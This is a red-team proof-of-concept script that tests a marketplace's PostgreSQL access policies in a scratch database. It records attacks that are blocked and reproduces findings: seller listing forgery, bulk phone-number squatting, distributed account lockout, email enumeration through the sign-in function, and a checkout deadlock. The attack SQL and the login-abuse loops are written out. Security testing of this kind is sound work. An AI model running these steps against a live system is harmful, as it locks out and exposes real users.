// Red-team review (2026-10-18): the proofs of concept behind SECURITY_REVIEW_2026-10-18.md, run in a scratch PostgreSQL.
//
//   node scripts/db/redteam-poc.mjs        (from the repository root; needs PostgreSQL's server programs, like the DB tests)
//
// N-lines are attacks the live guards stop. F-lines are findings that reproduce. Nothing here touches the live
// project: the function bodies and policies in test/db/fixture_redteam.sql are copies of the live text.
import fs from 'node:fs';
import { spawn, spawnSync } from 'node:child_process';
import path from 'node:path';
const repo = process.cwd();
const { startScratchPostgres, findPostgresBin } = await import('./scratchPostgres.mjs');
const pg = startScratchPostgres();
const out = [];
const log = (id, title, verdict, detail = '') => { out.push({ id, title, verdict, detail }); console.log(`[${id}] ${verdict} - ${title}${detail ? '\n      ' + String(detail).split('\n').join('\n      ') : ''}`); };
const U = { cust: '00000000-0000-4000-8000-0000000000b2', cust2: '00000000-0000-4000-8000-0000000000c3', sell: '00000000-0000-4000-8000-0000000000d4', sell2: '00000000-0000-4000-8000-0000000000e5', adm: '00000000-0000-4000-8000-0000000000a1' };
const SEL1 = '22222222-2222-4222-8222-000000000001', SEL2 = '22222222-2222-4222-8222-000000000002';
const P1 = '33333333-3333-4333-8333-000000000001', P2 = '33333333-3333-4333-8333-000000000002';
const ORD = '44444444-4444-4444-8444-000000000001';
try {
  pg.run('postgres', 'create database poc;');
  pg.run('poc', fs.readFileSync(`${repo}/test/db/fixture_redteam.sql`, 'utf8'), { singleTransaction: true });
  pg.run('poc', `
    insert into auth.users (id, email) values ('${U.cust}','cust@x.test'),('${U.cust2}','cust2@x.test'),('${U.sell}','sell@x.test'),('${U.sell2}','sell2@x.test'),('${U.adm}','adm@x.test');
    insert into public.profiles (id, role, seller_id, email) values ('${U.cust}','customer',null,'cust@x.test'),('${U.cust2}','customer',null,'cust2@x.test'),('${U.sell}','seller','${SEL1}','sell@x.test'),('${U.sell2}','seller','${SEL2}','sell2@x.test'),('${U.adm}','admin',null,'adm@x.test');
    insert into public.products (id, seller_id, name, artisan, yalla_item_code) values ('${P1}','${SEL1}','Zaatar','Seller One','YL-000001'),('${P2}','${SEL2}','Honey','Seller Two','YL-000002');
    insert into public.orders (id, user_id, seller_ids, product_ids, subtotal_usd, delivery_fee_usd, total_usd, shipping) values ('${ORD}','${U.cust}',array['${SEL1}'::uuid],array['${P1}'::uuid],20,3,23,'{"name":"A"}');
  `);
  const as = (who, sql, headers) => pg.asRole('poc', who === 'anon' ? 'anon' : 'authenticated', sql, { claims: who === 'anon' ? {} : { sub: U[who] }, settings: headers ? { 'request.headers': JSON.stringify(headers) } : {}, allowError: true });
  const q = sql => pg.run('poc', sql).out;

  // ── NEGATIVE CONTROLS: attacks the live guards are meant to stop ──────────────────────────────
  let r = as('cust', `update public.profiles set role = 'admin', seller_id = '${SEL1}' where id = '${U.cust}';`);
  log('N1', 'customer sets own profiles.role=admin and seller_id', q(`select role::text from public.profiles where id='${U.cust}'`) === 'customer' && q(`select seller_id is null from public.profiles where id='${U.cust}'`) === 't' ? 'BLOCKED (silently reverted by trigger)' : 'EXPLOITABLE', r.err);
  r = as('cust', `update public.profiles set email_verified = true where id = '${U.cust}';`);
  log('N2', 'customer sets own email_verified=true', r.err.includes('PROFILE_SECURITY_FIELDS_FORBIDDEN') ? 'BLOCKED' : 'EXPLOITABLE', r.err);
  r = as('cust', `update public.profiles set is_otp_verified = true where id = '${U.cust}';`);
  log('N3', 'customer sets own is_otp_verified=true', r.err.includes('PROFILE_SECURITY_FIELDS_FORBIDDEN') ? 'BLOCKED' : 'EXPLOITABLE', r.err);
  r = as('cust', `insert into public.profiles (id, role, seller_id, is_otp_verified) values ('${U.cust}','customer','${SEL1}',true);`);
  log('N4', 'customer re-inserts own profile with seller_id / is_otp_verified=true', r.ok ? 'EXPLOITABLE' : 'BLOCKED (row already exists: primary key; no DELETE policy)', r.err.split('\n')[0]);
  r = as('cust', `update public.profiles set role = 'admin' where id = '${U.cust2}';`);
  log('N5', 'customer edits ANOTHER profile', q(`select role::text from public.profiles where id='${U.cust2}'`) === 'customer' ? 'BLOCKED (RLS: 0 rows)' : 'EXPLOITABLE', r.out);
  r = as('cust', `update public.orders set total_usd = 0 where id = '${ORD}';`);
  log('N6', 'customer lowers own order total', q(`select total_usd from public.orders where id='${ORD}'`) === '23' ? 'BLOCKED (RLS: no UPDATE policy for customers)' : 'EXPLOITABLE', r.err);
  r = as('sell', `update public.orders set total_usd = 0 where id = '${ORD}';`);
  log('N7', 'seller of the order lowers its total', r.err.includes('ORDER_FINANCIAL_FIELDS_FORBIDDEN') ? 'BLOCKED' : 'EXPLOITABLE', r.err.split('\n')[0]);
  r = as('sell', `update public.orders set status = 'delivered' where id = '${ORD}';`);
  log('N8', 'seller marks the order delivered', r.err.includes('ORDER_STATUS_TRANSITION_FORBIDDEN') ? 'BLOCKED' : 'EXPLOITABLE', r.err.split('\n')[0]);
  r = as('sell2', `update public.orders set status = 'confirmed' where id = '${ORD}';`);
  log('N9', 'a seller who is NOT on the order advances it', q(`select status::text from public.orders where id='${ORD}'`) === 'pending' ? 'BLOCKED (RLS: 0 rows)' : 'EXPLOITABLE', r.out);
  r = as('sell', `update public.products set rating = 5, reviews_count = 900 where id = '${P1}';`);
  log('N10', 'seller sets own product rating / review count', r.err.includes('PRODUCT_SECURITY_FIELDS_FORBIDDEN') ? 'BLOCKED' : 'EXPLOITABLE', r.err.split('\n')[0]);
  r = as('sell', `update public.products set cost_price_usd = 1 where id = '${P1}';`);
  log('N11', 'seller changes cost price', r.err.includes('PRODUCT_SECURITY_FIELDS_FORBIDDEN') ? 'BLOCKED' : 'EXPLOITABLE', r.err.split('\n')[0]);
  r = as('sell', `update public.products set name = 'hijacked' where id = '${P2}';`);
  log('N12', "seller edits ANOTHER seller's product", q(`select name from public.products where id='${P2}'`) === 'Honey' ? 'BLOCKED (RLS: 0 rows)' : 'EXPLOITABLE', r.out);

  // ── POSITIVE: things that DO work for an attacker ─────────────────────────────────────────────
  r = as('sell', `update public.products set is_bestseller = true, is_featured = true, is_new_arrival = true, yalla_item_code = 'YL-000002', artisan = 'Seller Two' where id = '${P1}';`);
  log('F1', 'seller marks own product Bestseller/Featured/New, overwrites the system item code, and takes another maker\'s name', r.ok && q(`select is_bestseller and is_featured and is_new_arrival and yalla_item_code='YL-000002' and artisan='Seller Two' from public.products where id='${P1}'`) === 't' ? 'CONFIRMED' : 'not reproduced', r.err);
  r = as('cust', `insert into public.phone_registry (phone_key, user_id) values ('96171123456', '${U.cust}');`);
  log('F2', "any signed-in user claims someone else's phone number in the registry (migration B is still pending)", r.ok ? 'CONFIRMED' : 'not reproduced', r.err);
  r = as('cust', `insert into public.phone_registry (phone_key, user_id) select '9617' || lpad(i::text, 7, '0'), '${U.cust}' from generate_series(1, 5000) i;`);
  log('F2b', 'and 5,000 more in one request (no per-user cap)', r.ok && q(`select count(*) from public.phone_registry`) === '5001' ? 'CONFIRMED' : 'not reproduced', r.err);

  // ── F3: sign-in function: lock-out and enumeration, from different "addresses" ────────────────
  pg.run('poc', fs.readFileSync(`${repo}/supabase/migrations/20260925013151_password_check_for_sign_in.sql`, 'utf8'), { singleTransaction: true });
  q(`update auth.users set email = email where false`);
  pg.run('poc', `insert into auth.users (id, email, encrypted_password) values ('${U.cust}'::uuid, 'cust@x.test', extensions.crypt('Correct-Horse-9', extensions.gen_salt('bf', 6))) on conflict (id) do update set encrypted_password = excluded.encrypted_password, email = excluded.email;`);
  const call = (ip, email, pw) => as('anon', `select public.verify_login_password('${email}', '${pw}');`, { 'cf-connecting-ip': ip }).out;
  const seen = [];
  for (let i = 1; i <= 5; i++) seen.push(call(`198.51.100.${i}`, 'cust@x.test', `guess${i}`));
  const rightButLocked = call('203.0.113.99', 'cust@x.test', 'Correct-Horse-9');
  log('F3', 'five wrong guesses from five different addresses lock the victim out; their CORRECT password is then refused', rightButLocked === 'locked' ? 'CONFIRMED' : 'not reproduced', `answers: ${seen.join(', ')}, then correct password -> ${rightButLocked}`);
  const e1 = call('203.0.113.50', 'cust2@x.test', 'x'), e2 = call('203.0.113.51', 'nobody@x.test', 'x');
  log('F4', 'the same function tells a stranger whether an email has an account', (e1 !== e2) ? 'CONFIRMED' : 'not reproduced', `registered-with-no-password-set: ${e1}; unknown: ${e2}`);
  const rate = call('203.0.113.60', 'nobody@x.test', 'x');
  log('F4b', 'unknown-email probes are counted as failures per caller (30 per 15 min), so a rotating address is not limited', 'INFO', `answer after probe: ${rate}`);

  // ── F5: lock-order deadlock (the checkout locks products in the order the cart lists them) ────
  pg.run('poc', `insert into public.products (id, seller_id, name) values ('${'55555555-5555-4555-8555-00000000000a'}', '${SEL1}', 'A'), ('${'55555555-5555-4555-8555-00000000000b'}', '${SEL1}', 'B') on conflict do nothing;`);
  const A = '55555555-5555-4555-8555-00000000000a', B = '55555555-5555-4555-8555-00000000000b';
  const bin = findPostgresBin();
  const sess = (first, second) => new Promise(resolve => {
    const p = spawn(path.join(bin, 'psql'), ['-X', '-q', '-t', '-A', '-v', 'ON_ERROR_STOP=1', '-h', pg.socketDir, '-U', 'postgres', '-d', 'poc'], { stdio: ['pipe', 'pipe', 'pipe'] });
    let err = ''; p.stderr.on('data', d => err += d); p.on('close', code => resolve({ code, err: err.trim() }));
    p.stdin.end(`begin; select id from public.products where id='${first}' for update; select pg_sleep(1.5); select id from public.products where id='${second}' for update; commit;`);
  });
  const [s1, s2] = await Promise.all([sess(A, B), sess(B, A)]);
  const dead = [s1, s2].filter(s => /deadlock detected/.test(s.err)).length;
  log('F5', 'two shoppers whose carts hold the same two products in opposite order: one order fails with a deadlock', dead === 1 ? 'CONFIRMED' : `dead=${dead}`, (s1.err + '\n' + s2.err).trim().split('\n').slice(0, 3).join('\n'));
} catch (e) { console.error('POC ERROR', e.message); process.exitCode = 1; }
finally { pg.stop(); }
